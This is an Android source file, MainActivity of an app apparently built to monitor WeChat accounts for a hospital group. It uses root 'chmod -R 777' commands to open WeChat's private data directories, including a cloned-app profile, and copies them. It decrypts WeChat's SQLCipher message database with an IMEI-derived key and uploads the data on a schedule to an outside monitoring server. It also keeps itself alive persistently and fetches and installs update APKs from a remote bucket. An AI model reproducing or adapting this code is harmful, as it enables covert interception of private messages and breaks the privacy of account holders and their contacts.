package com.mylike.keepalive;

import android.app.Activity;
import android.app.AlertDialog;
import android.content.Context;
import android.content.DialogInterface;
import android.content.Intent;
import android.content.SharedPreferences;
import android.content.pm.PackageManager;
import android.os.Build;
import android.os.Bundle;
import android.os.Environment;
import android.os.Handler;
import android.os.Message;
import android.support.annotation.Nullable;
import android.support.v4.app.ActivityCompat;
import android.support.v4.graphics.PathUtils;
import android.support.v7.app.AppCompatActivity;
import android.util.Log;
import android.view.View;
import android.widget.Button;
import android.widget.EditText;
import android.widget.TextView;
import android.widget.Toast;

import com.android.volley.Request;
import com.android.volley.Response;
import com.android.volley.VolleyError;
import com.android.volley.toolbox.StringRequest;
import com.blankj.utilcode.util.AppUtils;
import com.blankj.utilcode.util.FileIOUtils;
import com.blankj.utilcode.util.FileUtils;
import com.blankj.utilcode.util.StringUtils;
import com.blankj.utilcode.util.ToastUtils;
import com.google.gson.Gson;
import com.mylike.keepalive.dialog.CommonUtil;
import com.mylike.keepalive.update.HProgressDialogUtils;
import com.mylike.keepalive.update.XHttpUpdateHttpService;
import com.xuexiang.xupdate.XUpdate;
import com.xuexiang.xupdate._XUpdate;
import com.xuexiang.xupdate.entity.UpdateError;
import com.xuexiang.xupdate.listener.OnUpdateFailureListener;
import com.xuexiang.xupdate.logs.ILogger;
import com.xuexiang.xupdate.service.OnFileDownloadListener;
import com.xuexiang.xupdate.utils.ApkInstallUtils;
import com.xuexiang.xupdate.utils.UpdateUtils;
import com.yanzhenjie.kalle.JsonBody;
import com.yanzhenjie.kalle.Kalle;
import com.yanzhenjie.kalle.simple.SimpleResponse;

import net.sqlcipher.database.SQLiteDatabase;

import org.json.JSONArray;
import org.json.JSONObject;

import live_library.KeepAliveManager;
import live_library.config.ForegroundNotification;
import live_library.config.ForegroundNotificationClickListener;
import live_library.wechat2.ConfigWechat;
import live_library.wechat2.UploadService;
import live_library.wechat2.UploadService1;
import live_library.wechat2.bean.ImgFlag;
import live_library.wechat2.bean.UserInfo;
import live_library.wechat2.db.SqlDataUtil;
import live_library.wechat2.db.SqlDataUtil1;
import live_library.wechat2.helper.UserInfoHelper;
import live_library.wechat2.http.RequestQueueSingle;
import live_library.wechat2.sns.QueryCallBack;
import live_library.wechat2.uploadpic.UploadPicService;
import live_library.wechat2.uploadpic.UploadPicService1;
import live_library.wechatlog.RLog;
import live_library.wechatutils.RootUtil;

import java.io.File;
import java.io.IOException;
import java.text.SimpleDateFormat;
import java.util.ArrayList;
import java.util.Arrays;
import java.util.Date;
import java.util.HashMap;
import java.util.List;
import java.util.Map;

import static com.xuexiang.xupdate.entity.UpdateError.ERROR.CHECK_NO_NEW_VERSION;
import static live_library.config.RunMode.HIGH_POWER_CONSUMPTION;
import static live_library.wechat2.db.SqlDataUtil.WX_DB_FILE_NAME;

public class MainActivity extends AppCompatActivity {

    private String TAG = getClass().getSimpleName();

    private SimpleDateFormat mSimpleDateFormat = new SimpleDateFormat("YYYY-MM-DD hh:mm:ss");


    private  Handler handler = new Handler(){
        @Override
        public void handleMessage(Message msg) {
            super.handleMessage(msg);
//            RLog.d("com.mylike.keepalive1.handler",new Date()+"");
            tvTime.setText(mSimpleDateFormat.format(new Date()));
//            sendDelayMeg();

        }
    };
    private TextView tvTime,tv_version;
    private EditText edit;
    private Button btn,btn1,btn_choose;

    private long mCurrentTime=0;
    private int times=0;
    String wxId = "";
    String wxId1 = "";
    private boolean isUpdate;
    @Override
    protected void onCreate(Bundle savedInstanceState) {
        super.onCreate(savedInstanceState);
        setContentView(R.layout.activity_main);
        RLog.d("com.mylike.keepalive.MainActivity","onCreate");

//        UploadService.getInstance(XApp.getApp());
//        UploadService1.getInstance();
        btn_choose = findViewById(R.id.btn_choose);
        tv_version = findViewById(R.id.tv_version);
        tv_version.setText("版本号："+AppUtils.getAppVersionName()+":"+AppUtils.getAppVersionCode());
        tvTime = findViewById(R.id.tv_time);
        verifyStoragePermissions(this);
        tv_version.setOnClickListener(new View.OnClickListener() {
            @Override
            public void onClick(View v) {
                if (mCurrentTime==0){
                    times=1;
                    mCurrentTime=System.currentTimeMillis();
//                    ToastUtils.showShort("第 "+times+" 次");
                    return;
                }
                if ((System.currentTimeMillis() - mCurrentTime) < 2000) {
                    mCurrentTime=System.currentTimeMillis();
                    times++;
                }else {
                    times=0;
                    mCurrentTime=0;
                }
                if (times==7){
                    chooseHosp();
                    times=0;
                    mCurrentTime=0;
                }
            }
        });
        edit = findViewById(R.id.edit);
        btn = findViewById(R.id.btn);
        btn1 = findViewById(R.id.btn1);
        SharedPreferences mSharedPreferences1 =  XApp.getApp().getSharedPreferences("yes_getImei", MODE_PRIVATE);
        int isSuccess = mSharedPreferences1.getInt("isSuccess",0);
//        if (isSuccess==1){
//            edit.setVisibility(View.GONE);
//            btn.setVisibility(View.GONE);
//        }
        findViewById(R.id.btn4).setOnClickListener(new View.OnClickListener() {
            @Override
            public void onClick(View v) {
                RootUtil.execRootCmd("chmod -R 777 " + SqlDataUtil.WX_ROOT);
//                new Thread (new Runnable() {
//                    public void run() {
                boolean isTrue = RootUtil.moveTest0("/data/data/com.tencent.mm/", SqlDataUtil.WX_ROOT);
                if (!isTrue) {
                    ToastUtils.showShort("请先登录微信");
                    CommonUtil.dismissLoadProgress();
                    return;
                }
                ToastUtils.showShort("复制成功");
            }
        });
        findViewById(R.id.btn5).setOnClickListener(new View.OnClickListener() {
            @Override
            public void onClick(View v) {
                RootUtil.execRootCmd("chmod -R 777 " + SqlDataUtil1.WX_ROOT);
//                RootUtil.execRootCmd("chmod -R 777 " + "/data/data/com.mylike.keepalive/tencent1/com.tencent.mm/shared_prefs/auth_info_key_prefs.xml");
//                new Thread (new Runnable() {
//                    public void run() {
                boolean isTrue = RootUtil.moveTest1("/data/user/999/com.tencent.mm/", SqlDataUtil1.WX_ROOT);
                if (!isTrue) {
                    ToastUtils.showShort("请先登录微信双开");
                    CommonUtil.dismissLoadProgress();
                    return;
                }
                ToastUtils.showShort("复制成功");
            }
        });
        btn.setOnClickListener(new View.OnClickListener() {
            @Override
            public void onClick(View v) {
                RootUtil.execRootCmd("chmod -R 777 " + SqlDataUtil.WX_ROOT);
                CommonUtil.showLoadProgress(MainActivity.this);
//                new Thread (new Runnable() {
//                    public void run() {
//                        boolean isTrue = RootUtil.moveTest0("/data/data/com.tencent.mm/", SqlDataUtil.WX_ROOT);
//                        if (!isTrue) {
//                            ToastUtils.showShort("请先登录微信");
//                            CommonUtil.dismissLoadProgress();
//                            return;
//                        }
                        String wxUin = SqlDataUtil.getCurrWxUin();
                        String userFileName = SqlDataUtil.md5("mm" + wxUin);
                        String copyFilePath = SqlDataUtil.WX_DB_DIR_PATH() + userFileName + "/" + SqlDataUtil.WX_DB_FILE_NAME;
//                        String copyFilePath = SqlDataUtil.getWX_ROOT_PATH()  + "/MicroMsg/" + userFileName + "/" + SqlDataUtil.WX_DB_FILE_NAME;
//                String copyFilePath = SqlDataUtil.CURR_APK_PATH + SqlDataUtil.COPY_WX_DATA_DB;
                        File copyWxDataDb = new File(copyFilePath);
                        final String imei;
                        if (StringUtils.isEmpty(edit.getText().toString())) {
                            imei = UploadPicService.getImei();
                        } else {
                            imei = edit.getText().toString();
                        }
                        String message = SqlDataUtil.testCommonWxDb(copyWxDataDb, imei);
//                Toast.makeText(getActivity(), message, Toast.LENGTH_SHORT).show();
                        AlertDialog alertDialog = new AlertDialog.Builder(MainActivity.this)
                                .setTitle("Imei:" + imei + ",Uin:" + SqlDataUtil.getCurrWxUin())
                                .setMessage(message + "")
                                .setPositiveButton(android.R.string.yes, (dialog, which) -> {
                                    SharedPreferences mSharedPreferences = XApp.getApp().getSharedPreferences("yes_getImei", MODE_PRIVATE);
                                    SharedPreferences.Editor editor = mSharedPreferences.edit();
                                    if (message != null && "成功".contains(message)) {
                                        editor.putString("Imei", imei);
                                        editor.putInt("isSuccess", 1);
                                        editor.commit();
                                    }
                                })
                                .create();
                        try {
                            alertDialog.show();
                        } catch (Throwable ignored) {
                        }
//                    }
//                }).start();
                    CommonUtil.dismissLoadProgress();
            }
        });
        btn1.setOnClickListener(new View.OnClickListener() {
            @Override
            public void onClick(View v) {
                RootUtil.execRootCmd("chmod -R 777 " + SqlDataUtil1.WX_ROOT);
//                RootUtil.execRootCmd("chmod -R 777 " + "/data/data/com.mylike.keepalive/tencent1/com.tencent.mm/shared_prefs/auth_info_key_prefs.xml");
                CommonUtil.showLoadProgress(MainActivity.this);
//                new Thread (new Runnable() {
//                    public void run() {
//                        boolean isTrue = RootUtil.moveTest1("/data/user/999/com.tencent.mm/", SqlDataUtil1.WX_ROOT);
//                        if (!isTrue) {
//                            ToastUtils.showShort("请先登录微信双开");
//                            CommonUtil.dismissLoadProgress();
//                            return;
//                        }
                        String wxUin = SqlDataUtil1.getCurrWxUin();
                        String userFileName = SqlDataUtil1.md5("mm" + wxUin);
                        String copyFilePath = SqlDataUtil1.WX_DB_DIR_PATH() + userFileName + "/" + SqlDataUtil1.WX_DB_FILE_NAME;
//                String copyFilePath = SqlDataUtil.CURR_APK_PATH + SqlDataUtil.COPY_WX_DATA_DB;
                        File copyWxDataDb = new File(copyFilePath);
                        final String imei;
                        if (StringUtils.isEmpty(edit.getText().toString())) {
                            imei = UploadPicService1.getImei();
                        } else {
                            imei = edit.getText().toString();
                        }
                        String message = SqlDataUtil1.testCommonWxDb(copyWxDataDb, imei);
//                Toast.makeText(getActivity(), message, Toast.LENGTH_SHORT).show();
                        AlertDialog alertDialog = new AlertDialog.Builder(MainActivity.this)
                                .setTitle("Imei-1:" + imei + ",Uin-1:" + SqlDataUtil1.getCurrWxUin())
                                .setMessage(message + "")
                                .setPositiveButton(android.R.string.yes, (dialog, which) -> {
                                    SharedPreferences mSharedPreferences = XApp.getApp().getSharedPreferences("yes_getImei", MODE_PRIVATE);
                                    SharedPreferences.Editor editor = mSharedPreferences.edit();
                                    if (message != null && "成功".contains(message)) {
                                        editor.putString("Imei1", imei);
                                        editor.putInt("isSuccess1", 1);
                                        editor.commit();
                                    }
                                })
                                .create();
                        try {
                            alertDialog.show();
                        } catch (Throwable ignored) {
                        }
//                    }
//                }).start();
                CommonUtil.dismissLoadProgress();
            }
        });
        btn_choose.setOnClickListener(new View.OnClickListener() {
            @Override
            public void onClick(View v) {

                final String [] itemsName={"每隔5分钟处理数据","每隔10分钟处理数据","每隔20分钟处理数据",
                        "每隔30分钟处理数据","每隔60分钟处理数据","每隔120分钟处理数据"};
//                final int [] itemsId={0,1,2,3,4,5};
                SharedPreferences mSharedPreferences1 =  XApp.getApp().getSharedPreferences("yes_getImei", MODE_PRIVATE);
                int itemId = mSharedPreferences1.getInt("itemsId",3);
                AlertDialog alertDialog = new AlertDialog.Builder(MainActivity.this)
                        .setTitle("选择数据上传频率")
                        .setSingleChoiceItems(itemsName, itemId,new DialogInterface.OnClickListener(){

                            @Override
                            public void onClick(DialogInterface dialog, int which) {
//                                String name = itemsName[which];
                                SharedPreferences mSharedPreferences =  XApp.getApp().getSharedPreferences("yes_getImei", MODE_PRIVATE);
                                SharedPreferences.Editor editor = mSharedPreferences.edit();
                                editor.putInt("itemsId", which);
                                editor.commit();
                            }})
                        .setPositiveButton("确定", new DialogInterface.OnClickListener(){

                            @Override
                            public void onClick(DialogInterface dialog, int which) {


                            }})
                        .create();

                alertDialog.show();
            }
        });
        findViewById(R.id.btn2).setOnClickListener(new View.OnClickListener() {
            @Override
            public void onClick(View v) {
                new Thread (new Runnable() {
                    public void run() {
                        try {
                            RootUtil.execRootCmd("chmod -R 777 " + SqlDataUtil.WX_ROOT);
                            UploadService.getInstance(XApp.getApp()).startUpload();
//                            RootUtil.move0("/data/data/com.tencent.mm/", SqlDataUtil.WX_ROOT);
                        } catch (Exception e) {
                            RLog.w(TAG, "btn2-Exception-"+e.getMessage());
                            e.printStackTrace();
                        }
//                        RLog.w(TAG, "Helpers doHardWork() sleep finished");
                    }
                }).start();

            }
        });
        findViewById(R.id.btn3).setOnClickListener(new View.OnClickListener() {
            @Override
            public void onClick(View v) {
                new Thread (new Runnable() {
                    public void run() {
                        try {
                            RootUtil.execRootCmd("chmod -R 777 " + SqlDataUtil1.WX_ROOT);
                            UploadService1.getInstance().startUpload();
//                            RootUtil.move1("/data/user/999/com.tencent.mm/", SqlDataUtil1.WX_ROOT );
                        } catch (Exception e) {
                            RLog.w(TAG, "btn3-Exception-"+e.getMessage());
                            e.printStackTrace();
                        }
//                        RLog.w(TAG, "Helpers doHardWork() sleep finished");
                    }
                }).start();
            }
        });
        /**
         * 开启电量优化
         */
        if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.M) {
            KeepAliveManager.batteryOptimizations(getApplicationContext());
        }

    }

    /**
     * 启动代码适配的保活
     * @param view
     */
    public void startKeepAlive(View view) {
        start();
        sendDelayMeg();
    }
    private static final int REQUEST_EXTERNAL_STORAGE = 1;
    private static String[] PERMISSIONS_STORAGE = {
            "android.permission.READ_EXTERNAL_STORAGE",
            "android.permission.WRITE_EXTERNAL_STORAGE" ,
            "android.permission.MANAGE_EXTERNAL_STORAGE"
        };


    public static void verifyStoragePermissions(Activity activity) {

        try {
            //检测是否有写的权限
            int permission = ActivityCompat.checkSelfPermission(activity,
                    "android.permission.WRITE_EXTERNAL_STORAGE");
            if (permission != PackageManager.PERMISSION_GRANTED) {
                // 没有写的权限，去申请写的权限，会弹出对话框
                ActivityCompat.requestPermissions(activity, PERMISSIONS_STORAGE,REQUEST_EXTERNAL_STORAGE);
            }else {
                String folderPath = (Environment.getExternalStorageDirectory().getAbsolutePath() + File.separator +
                        "yes" + File.separator + "logs" );
                long lenght = com.blankj.utilcode.util.FileUtils.getDirLength(folderPath);
                RLog.d("yes-length:",lenght+"");
                if (lenght>1073741824){//1073741824  =  1G
                    com.blankj.utilcode.util.FileUtils.deleteAllInDir(folderPath);
                }
            }
        } catch (Exception e) {
            e.printStackTrace();
        }
    }
    private void downloadApk(){//app-release
        XUpdate.newBuild(this)
                .updateHttpService(new XHttpUpdateHttpService("https://wechat-monitor.oss-cn-shanghai.aliyuncs.com"))
                .apkCacheDir(Environment.getExternalStorageDirectory().getAbsolutePath()+"/yes/") //设置下载缓存的根目录
                .build()
                .download("https://wechat-monitor.oss-cn-shanghai.aliyuncs.com/new-mylike-service.apk", new OnFileDownloadListener() {   //设置下载的地址和下载的监听
                    @Override
                    public void onStart() {
//                        CommonUtil.showLoadProgress(MainActivity.this);
                        HProgressDialogUtils.showHorizontalProgressDialog(MainActivity.this, "下载进度", false);
                    }

                    @Override
                    public void onProgress(float progress, long total) {
                        ToastUtils.showShort("正在升级安装中，请耐心等待...");
                        HProgressDialogUtils.setProgress(Math.round(progress * 100));
                    }

                    @Override
                    public boolean onCompleted(File file) {
                        HProgressDialogUtils.cancel();
//                        CommonUtil.dismissLoadProgress();
//                        ToastUtils.showShort("apk下载完毕，文件路径：" + file.getPath());
                        //   /storage/emulated/0/Download/unknown_version/xupdate_demo_1.0.2.apk
//                            /storage/emulated/0/Download/xupdate_demo_1.0.2.apk
                        isUpdate = true;
//                        ApkInstallUtils.installAppSilent(MainActivity.this,Environment.getExternalStorageDirectory().getAbsolutePath()+"/yes/unknown_version/new-mylike-service.apk");
                        _XUpdate.startInstallApk(MainActivity.this, FileUtils.getFileByPath(Environment.getExternalStorageDirectory().getAbsolutePath()+"/yes/unknown_version/new-mylike-service.apk")); //填写文件所在的路径
                        return false;
                    }

                    @Override
                    public void onError(Throwable throwable) {
                        HProgressDialogUtils.cancel();
                        ToastUtils.showShort("下载失败："+throwable.getMessage());
                    }
                });
    }
    private void sendDelayMeg() {
//        ToastUtils.showShort("sendDelayMeg1："+new Date());
//        RLog.d("com.mylike.keepalive.sendDelayMeg",new Date()+"");
        handler.sendEmptyMessageDelayed(0, 5000);
        start();
    }

    /**
     * 停止保活
     * @param view
     */
    public void stopKeepAlive(View view) {
        KeepAliveManager.stopWork(getApplication());
    }

    public void start() {
        //启动保活服务
        KeepAliveManager.toKeepAlive(
                getApplication()
                , HIGH_POWER_CONSUMPTION,
                "进程保活",
                "美莱服务",
                R.mipmap.icon,
                new ForegroundNotification(
                        //定义前台服务的通知点击事件
                        new ForegroundNotificationClickListener() {
                            @Override
                            public void foregroundNotificationClick(Context context, Intent intent) {
                                Log.d("JOB-->", " foregroundNotificationClick");
                            }
                        })
        );
    }

    /**
     * 开启系统设置保活
     * @param view
     */
    public void launch_system(View view) {
        sendDelayMeg();
        KeepAliveManager.launcherSyskeepAlive(getApplicationContext());
    }


    @Override
    public void onBackPressed() {
        moveTaskToBack(true);
    }

    private boolean chooseHosp(){
        String imei = UploadPicService.getImei();
        //将微信数据库拷贝出来，因为直接连接微信的db，会导致微信崩溃
        //获取微信数据库存放地址
        String userFileName = SqlDataUtil.md5("mm" + SqlDataUtil.getCurrWxUin());
        File copyWxDataDb  = new File(SqlDataUtil.WX_DB_DIR_PATH()+userFileName + "/" + WX_DB_FILE_NAME);
        if (copyWxDataDb!=null&&copyWxDataDb.exists()) {
            SQLiteDatabase contactDb = SqlDataUtil.openCommonWxDb(copyWxDataDb, imei);
            if (contactDb != null) {
                final List<UserInfo> list = UserInfoHelper.getUserInfoList(contactDb);
                //查找微信id
                if (list.size() > 0) {
                    for (UserInfo userInfo : list) {
                        if ("2".equals(userInfo.id)) {
                            wxId = userInfo.value;
                        }
                    }
                }
                contactDb.close();
            }
        }

        imei = UploadPicService1.getImei();
        userFileName = SqlDataUtil1.md5("mm" + SqlDataUtil1.getCurrWxUin());
        copyWxDataDb = new File(SqlDataUtil1.WX_DB_DIR_PATH()+userFileName + "/" + SqlDataUtil.WX_DB_FILE_NAME);
        if (copyWxDataDb!=null&&copyWxDataDb.exists()) {
            SQLiteDatabase contactDb = SqlDataUtil1.openCommonWxDb(copyWxDataDb, imei);
            if (contactDb != null) {
                final List<UserInfo> list = UserInfoHelper.getUserInfoList(contactDb);
                //查找微信id
                if (list.size() > 0) {
                    for (UserInfo userInfo : list) {
                        if ("2".equals(userInfo.id)) {
                            wxId1 = userInfo.value;
                        }
                    }
                }
                contactDb.close();
            }
        }
        RLog.d(TAG, "chooseHosp-wxId:" + wxId);
        RLog.d(TAG, "chooseHosp-wxId-1:" + wxId1);

        Kalle.get(ConfigWechat.getAreaList+wxId).perform(new QueryCallBack<String>() {

            @Override
            public void onResponse(SimpleResponse<String, String> response) {
                try {
                    final String [] itemsName;
                    final String [] itemsId;
                    JSONObject jsonObject = new JSONObject(response.succeed());
                    String msg = jsonObject.optString("msg");
                    if ("OK".equals(msg)){
                        JSONObject jsonObject1 = jsonObject.getJSONObject("data");
                        String dept = jsonObject1.getString("dept");
                        JSONArray jsonArray = jsonObject1.getJSONArray("list");
                        itemsName =new String[jsonArray.length()];
                        itemsId =new String[jsonArray.length()];
                        for(int j=0;j<jsonArray.length();j++) {
                            JSONObject jsonObject2 = jsonArray.getJSONObject(j);
                            String id = jsonObject2.optString("id");
                            String name = jsonObject2.optString("name");
                            itemsName[j] = name;
                            itemsId[j] = id;
                        }
                        showDialog(MainActivity.this,itemsName,itemsId,dept,wxId,wxId1);
                    }

                }catch (Exception e){
                    RLog.d(TAG, "getAreaList:"+e.getMessage());
                }
//                RLog.d(TAG, "response-httpPicAddress: " + response.succeed());

            }
        });
        return false;
    }
    private static void showDialog(Activity activity, final String[] itemName, final String[] itemId, final String dept, final String wxId, final String wxId1){
        try {
            int id;
            if (StringUtils.isEmpty(dept)||dept.equals("null")){
                id = 0;
            }else {
                List list = new ArrayList(Arrays.asList(itemId));
                if(list.contains(dept)){
                    id = list.indexOf(dept);
                }else {
                    id = 0;
                }
            }
            AlertDialog alertDialog = new AlertDialog.Builder(activity)
                    .setTitle("选择您所属的医院")
                    .setSingleChoiceItems(itemName, id,new DialogInterface.OnClickListener(){

                        @Override
                        public void onClick(DialogInterface dialog, int which) {
                            try {
                                JSONArray array = new JSONArray();
                                if (!StringUtils.isEmpty(wxId)){
                                    array.put(wxId);
                                }
                                if (!StringUtils.isEmpty(wxId1)){
                                    array.put(wxId1);
                                }
                                JSONObject json1 = new JSONObject();
                                json1.put("tenantDept", itemId[which] + "");
                                json1.put("vxid", array);
                                JsonBody body = new JsonBody(json1.toString());
                                Kalle.post(ConfigWechat.setArea).body(body).perform(new QueryCallBack<String>() {

                                    @Override
                                    public void onResponse(SimpleResponse<String, String> response) {
                                        try {
                                            JSONObject jsonObject = new JSONObject(response.succeed());
                                            String msg = jsonObject.optString("msg");
                                            if ("OK".equals(msg)) {
                                                File file= new File(Environment.getExternalStorageDirectory()+"/yes/dept.txt");
                                                if (!file.exists()){
                                                    try {
                                                        file.createNewFile();
                                                    } catch (IOException e) {
                                                        e.printStackTrace();
                                                    }
                                                }
                                                FileIOUtils.writeFileFromString(file,itemId[which] + "");
                                                ToastUtils.showShort("已经成功绑定"+array.length()+"个微信");
                                            }

                                        } catch (Exception e) {
                                        }

                                    }
                                });
                            }catch (Exception e){}
                        }})
                    .setPositiveButton("确定", new DialogInterface.OnClickListener(){

                        @Override
                        public void onClick(DialogInterface dialog, int which) {


                        }})
                    .create();

            alertDialog.show();
        } catch (Throwable ignored) {
        }
    }

    @Override
    protected void onDestroy() {
        super.onDestroy();
//        handler.removeMessages(0);
//        handler = null;
//        RLog.d("com.mylike.keepalive.MainActivity","onDestroy");
//        Log.e("MainActivity","onDestroy");
//        sendDelayMeg();
    }

    @Override
    protected void onPause() {
        super.onPause();
//        RLog.d("com.mylike.keepalive.MainActivity","onPause");
//        Log.e("MainActivity","onPause");
        isUpdate = true;
    }

    @Override
    protected void onResume() {
        super.onResume();
//        RLog.d("com.mylike.keepalive.MainActivity","onResume");
//        Log.e("MainActivity","onResume");
        start();
        Kalle.get("http://monitor.shmylike.com//groupCtrlApi/his_cloud/wechatVersion").perform(new QueryCallBack<String>() {

            @Override
            public void onResponse(SimpleResponse<String, String> response) {
                try {
                    JSONObject jsonObject = new JSONObject(response.succeed());
                    int VersionCode = jsonObject.optInt("VersionCode");
                    int vcode = AppUtils.getAppVersionCode();
                    if (vcode<VersionCode){
                        if (isUpdate)return;
                        isUpdate = true;
                        downloadApk();
                    }
                }catch (Exception e){

                }
//                RLog.d(TAG, "response-httpPicAddress: " + response.succeed());

            }
        });
    }

    @Override
    protected void onStart() {
        super.onStart();
//        RLog.d("com.mylike.keepalive.MainActivity","onStart");
//        Log.e("MainActivity","onStart");
    }

    @Override
    protected void onRestart() {
        super.onRestart();
//        RLog.d("com.mylike.keepalive.MainActivity","onRestart");
//        Log.e("MainActivity","onRestart");
//        start();
    }

    @Override
    protected void onStop() {
        super.onStop();
//        RLog.d("com.mylike.keepalive.MainActivity","onStop");
//        Log.e("MainActivity","onStop");
//        start();
    }

    @Override
    protected void onSaveInstanceState(Bundle outState) {
        super.onSaveInstanceState(outState);
//        RLog.d("com.mylike.keepalive.MainActivity","onSaveInstanceState");
//        Log.e("MainActivity","onSaveInstanceState");
    }

    @Override
    protected void onNewIntent(Intent intent) {
        super.onNewIntent(intent);
//        RLog.d("com.mylike.keepalive.MainActivity","onNewIntent");
//        Log.e("MainActivity","onNewIntent");
//        start();
    }

    @Override
    protected void onActivityResult(int requestCode, int resultCode, @Nullable Intent data) {
        super.onActivityResult(requestCode, resultCode, data);
//        RLog.d("com.mylike.keepalive.MainActivity","onActivityResult");
//        Log.e("MainActivity","onActivityResult");

    }

    @Override
    public void finish() {
        super.finish();
//        RLog.d("com.mylike.keepalive.MainActivity","finish");
//        Log.e("MainActivity","finish");
//        sendDelayMeg();
    }

}
